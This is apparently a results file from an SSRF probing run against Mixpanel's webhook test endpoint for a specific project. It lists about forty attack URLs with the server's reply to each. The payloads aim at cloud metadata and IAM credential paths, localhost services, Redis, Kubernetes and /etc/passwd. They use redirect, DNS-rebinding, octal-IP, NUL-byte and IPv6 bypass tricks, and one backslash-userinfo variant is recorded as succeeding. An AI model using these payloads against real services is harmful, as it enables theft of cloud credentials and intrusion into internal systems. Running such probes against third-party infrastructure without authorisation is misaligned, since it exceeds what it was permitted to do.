@@ -1,0 +1,239 @@
+{
+  "results": [
+    {
+      "tag": "baseline-v2",
+      "url": "https://webhook.site/9a80587a-10b4-4350-97b2-6121770760eb/baseline-v2-873c27b0",
+      "status": 200,
+      "body_200": "{\"status\": \"ok\", \"results\": {\"success\": true, \"status_code\": 200, \"message\": \"Webhook responded with status 200\"}}"
+    },
+    {
+      "tag": "redir-bin-200",
+      "url": "https://httpbin.org/redirect-to?url=https://webhook.site/9a80587a-10b4-4350-97b2-6121770760eb/redir-followed&status_code=302",
+      "status": 200,
+      "body_200": "{\"status\": \"ok\", \"results\": {\"success\": true, \"status_code\": 200, \"message\": \"Webhook responded with status 200\"}}"
+    },
+    {
+      "tag": "redir-bingo-200",
+      "url": "https://httpbingo.org/redirect-to?url=https://webhook.site/9a80587a-10b4-4350-97b2-6121770760eb/bingo-followed&status_code=302",
+      "status": 400,
+      "body_200": "{\"status\": \"error\", \"error\": \"Failed to send test webhook request\"}"
+    },
+    {
+      "tag": "redir-bin-imds",
+      "url": "https://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/&status_code=302",
+      "status": 400,
+      "body_200": "{\"status\": \"error\", \"error\": \"Failed to send test webhook request\"}"
+    },
+    {
+      "tag": "redir-bin-imds-307",
+      "url": "https://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/&status_code=307",
+      "status": 400,
+      "body_200": "{\"status\": \"error\", \"error\": \"Failed to send test webhook request\"}"
+    },
+    {
+      "tag": "redir-bin-gcp",
+      "url": "https://httpbin.org/redirect-to?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token&status_code=302",
+      "status": 400,
+      "body_200": "{\"status\": \"error\", \"error\": \"Failed to send test webhook request\"}"
+    },
+    {
+      "tag": "redir-bingo-imds",
+      "url": "https://httpbingo.org/redirect-to?url=http://169.254.169.254/latest/meta-data/&status_code=302",
+      "status": 400,
+      "body_200": "{\"status\": \"error\", \"error\": \"Failed to send test webhook request\"}"
+    },
+    {
+      "tag": "redir-bin-localhost",
+      "url": "https://httpbin.org/redirect-to?url=http://127.0.0.1/&status_code=302",
+      "status": 400,
+      "body_200": "{\"status\": \"error\", \"error\": \"Failed to send test webhook request\"}"
+    },
+    {
+      "tag": "redir-nghttp2",
+      "url": "https://nghttp2.org/httpbin/redirect-to?url=http://169.254.169.254/latest/meta-data/&status_code=302",
+      "status": 400,
+      "body_200": "{\"status\": \"error\", \"error\": \"Failed to send test webhook request\"}"
+    },
+    {
+      "tag": "rbndr-pub-imds",
+      "url": "http://7f000001.a9fea9fe.rbndr.us/latest/meta-data/",
+      "status": 400,
+      "body_200": "{\"status\": \"error\", \"error\": \"Failed to send test webhook request\"}"
+    },
+    {
+      "tag": "rbndr-pub-imds-iam",
+      "url": "http://7f000001.a9fea9fe.rbndr.us/latest/meta-data/iam/security-credentials/",
+      "status": 400,
+      "body_200": "{\"status\": \"error\", \"error\": \"Failed to send test webhook request\"}"
+    },
+    {
+      "tag": "rbndr-cf-imds",
+      "url": "http://01010101.a9fea9fe.rbndr.us/latest/meta-data/",
+      "status": 400,
+      "body_200": "{\"status\": \"error\", \"error\": \"Failed to send test webhook request\"}"
+    },
+    {
+      "tag": "rbndr-goog-imds",
+      "url": "http://08080808.a9fea9fe.rbndr.us/latest/meta-data/",
+      "status": 400,
+      "body_200": "{\"status\": \"error\", \"error\": \"Failed to send test webhook request\"}"
+    },
+    {
+      "tag": "1ums-pub-imds",
+      "url": "http://make-169.254.169.254-rr-1.1u.ms/latest/meta-data/",
+      "status": 400,
+      "body_200": "{\"status\": \"error\", \"error\": \"Failed to send test webhook request\"}"
+    },
+    {
+      "tag": "1ums-make-imds",
+      "url": "http://make.169.254.169.254.1u.ms/latest/meta-data/",
+      "status": 400,
+      "body_200": "{\"status\": \"error\", \"error\": \"Failed to send test webhook request\"}"
+    },
+    {
+      "tag": "ldap-int",
+      "url": "ldap://localhost:389/",
+      "status": 500,
+      "body_200": "{\n  \"status\": \"error\",\n  \"message\": \"An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via https://mixpanel.com/get-support and reference Error ID: c128888ae7464c4e9d4e02190f2c82e6\"\n}\n"
+    },
+    {
+      "tag": "dict-redis",
+      "url": "dict://127.0.0.1:6379/info",
+      "status": 500,
+      "body_200": "{\n  \"status\": \"error\",\n  \"message\": \"An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via https://mixpanel.com/get-support and reference Error ID: b2b2471e8b5444f398b97085d85ad8e0\"\n}\n"
+    },
+    {
+      "tag": "jar-imds",
+      "url": "jar:http://169.254.169.254/latest/meta-data/!/",
+      "status": 500,
+      "body_200": "{\n  \"status\": \"error\",\n  \"message\": \"An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via https://mixpanel.com/get-support and reference Error ID: ad912ae7bb51403785fb15777eccd99d\"\n}\n"
+    },
+    {
+      "tag": "netdoc-passwd",
+      "url": "netdoc:///etc/passwd",
+      "status": 500,
+      "body_200": "{\n  \"status\": \"error\",\n  \"message\": \"An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via https://mixpanel.com/get-support and reference Error ID: e570d2bd147c42cc90b61e147cad6a29\"\n}\n"
+    },
+    {
+      "tag": "cidr-127-0-1-3",
+      "url": "http://127.0.1.3/",
+      "status": 400,
+      "body_200": "{\"status\": \"error\", \"error\": \"Failed to send test webhook request\"}"
+    },
+    {
+      "tag": "cidr-127-1-1-1",
+      "url": "http://127.1.1.1/",
+      "status": 400,
+      "body_200": "{\"status\": \"error\", \"error\": \"Failed to send test webhook request\"}"
+    },
+    {
+      "tag": "octal-127",
+      "url": "http://0177.0.0.1/",
+      "status": 400,
+      "body_200": "{\"status\": \"error\", \"error\": \"Failed to send test webhook request\"}"
+    },
+    {
+      "tag": "nul-imds",
+      "url": "http://169.254.169.254%00.example.com/latest/meta-data/",
+      "status": 500,
+      "body_200": "{\n  \"status\": \"error\",\n  \"message\": \"An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via https://mixpanel.com/get-support and reference Error ID: 6548034bedc54f0f81dff3da1c9e61bf\"\n}\n"
+    },
+    {
+      "tag": "under-host",
+      "url": "http://_imds.169.254.169.254.nip.io/latest/meta-data/",
+      "status": 400,
+      "body_200": "{\"status\": \"error\", \"error\": \"Failed to send test webhook request\"}"
+    },
+    {
+      "tag": "ipv6-zone",
+      "url": "http://[fe80::a9fe:a9fe%25eth0]/latest/meta-data/",
+      "status": 400,
+      "body_200": "{\"status\": \"error\", \"error\": \"url: &#x27;http://[fe80::a9fe:a9fe%25eth0]/latest/meta-data/&#x27; is not a &#x27;uri&#x27;\", \"details\": {\"schema\": {\"format\": \"uri\", \"maxLength\": 2083, \"minLength\": 1, \"title\": \"\", \"type\": \"string\"}, \"data\": null, \"path\": [\"root\", \"url\"]}}"
+    },
+    {
+      "tag": "ipv4-zeropad",
+      "url": "http://169.0254.0169.0254/",
+      "status": 500,
+      "body_200": "{\n  \"status\": \"error\",\n  \"message\": \"An unexpected error occurred. Please try again. If this issue persists, please get in touch with us via https://mixpanel.com/get-support and reference Error ID: 58cacd92939f41fbaff2b699dc6c045e\"\n}\n"
+    },
+    {
+      "tag": "ipv6-mapped-rev",
+      "url": "http://[::ffff:0a9fe:a9fe]/",
+      "status": 400,
+      "body_200": "{\"status\": \"error\", \"error\": \"url: &#x27;http://[::ffff:0a9fe:a9fe]/&#x27; is not a &#x27;uri&#x27;\", \"details\": {\"schema\": {\"format\": \"uri\", \"maxLength\": 2083, \"minLength\": 1, \"title\": \"\", \"type\": \"string\"}, \"data\": null, \"path\": [\"root\", \"url\"]}}"
+    },
+    {
+      "tag": "mp-internal-1",
+      "url": "http://mixpanel-api.internal/",
+      "status": 400,
+      "body_200": "{\"status\": \"error\", \"error\": \"Failed to send test webhook request\"}"
+    },
+    {
+      "tag": "mp-internal-2",
+      "url": "http://api.mixpanel.svc.cluster.local/",
+      "status": 400,
+      "body_200": "{\"status\": \"error\", \"error\": \"Failed to send test webhook request\"}"
+    },
+    {
+      "tag": "mp-internal-3",
+      "url": "http://consul.service.consul:8500/v1/kv/?recursive",
+      "status": 400,
+      "body_200": "{\"status\": \"error\", \"error\": \"Failed to send test webhook request\"}"
+    },
+    {
+      "tag": "k8s-api",
+      "url": "https://kubernetes.default.svc/api/v1/",
+      "status": 400,
+      "body_200": "{\"status\": \"error\", \"error\": \"Failed to send test webhook request\"}"
+    },
+    {
+      "tag": "actuator",
+      "url": "http://localhost:8080/actuator/env",
+      "status": 400,
+      "body_200": "{\"status\": \"error\", \"error\": \"Failed to send test webhook request\"}"
+    },
+    {
+      "tag": "aws-instance-data",
+      "url": "http://instance-data/latest/meta-data/",
+      "status": 400,
+      "body_200": "{\"status\": \"error\", \"error\": \"Failed to send test webhook request\"}"
+    },
+    {
+      "tag": "aws-region-alias",
+      "url": "http://imds.us-east-1.amazonaws.com/latest/meta-data/",
+      "status": 400,
+      "body_200": "{\"status\": \"error\", \"error\": \"Failed to send test webhook request\"}"
+    },
+    {
+      "tag": "zero-host",
+      "url": "http://0/",
+      "status": 400,
+      "body_200": "{\"status\": \"error\", \"error\": \"Failed to send test webhook request\"}"
+    },
+    {
+      "tag": "ws-bs-userinfo",
+      "url": "http://169.254.169.254%5C@webhook.site/9a80587a-10b4-4350-97b2-6121770760eb/ws-bs",
+      "status": 200,
+      "body_200": "{\"status\": \"ok\", \"results\": {\"success\": true, \"status_code\": 200, \"message\": \"Webhook responded with status 200\"}}"
+    },
+    {
+      "tag": "ipv6-prefix-trick",
+      "url": "http://[64:ff9b::a9fe:a9fe]/latest/meta-data/",
+      "status": 400,
+      "body_200": "{\"status\": \"error\", \"error\": \"Failed to send test webhook request\"}"
+    },
+    {
+      "tag": "nat64-v2",
+      "url": "http://[64:ff9b:1::a9fe:a9fe]/",
+      "status": 400,
+      "body_200": "{\"status\": \"error\", \"error\": \"Failed to send test webhook request\"}"
+    },
+    {
+      "tag": "ipv6-lo-port",
+      "url": "http://[::1]:80/admin",
+      "status": 400,
+      "body_200": "{\"status\": \"error\", \"error\": \"Failed to send test webhook request\"}"
+    }
+  ],
+  "endpoint": "https://mixpanel.com/api/app/projects/4025923/webhooks/test"
+}
